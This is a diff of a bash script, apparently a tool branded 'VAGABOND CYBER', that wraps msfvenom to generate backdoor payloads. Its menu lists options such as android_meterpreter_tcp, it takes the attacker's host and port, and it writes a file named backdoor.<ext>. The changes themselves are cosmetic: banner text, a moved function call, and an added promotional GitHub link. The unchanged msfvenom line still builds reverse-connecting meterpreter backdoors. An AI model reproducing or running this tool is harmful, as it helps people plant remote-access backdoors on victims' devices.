@@ -2,7 +2,7 @@
 mkdir backdoor
 clear
 autobackdoor(){
-echo '                            Create Backdoor '
+echo '                           - Creating Backdoor - '
 sleep 1s
 echo -n '                                 .'
 sleep 1s
@@ -19,6 +19,10 @@ done
 echo ''
 toilet -f shadow -F metal 'VAGABOND CYBER'
 sleep 0.2
+echo 'Visit > https://github.com/Kaitogun'
+echo ''
+}
+autobackdoor | lolcat
 echo '   -- Pilih Backdoor -- '
 sleep 0.08
 echo '  [1] android_meterpreter_tcp'
@@ -90,5 +94,3 @@ echo $ext
 echo $host
 echo $port
 msfvenom -p $tcp LHOST=$host LPORT=$port -f $ext -o backdoor/backdoor.$ext1
-}
-autobackdoor | lolcat
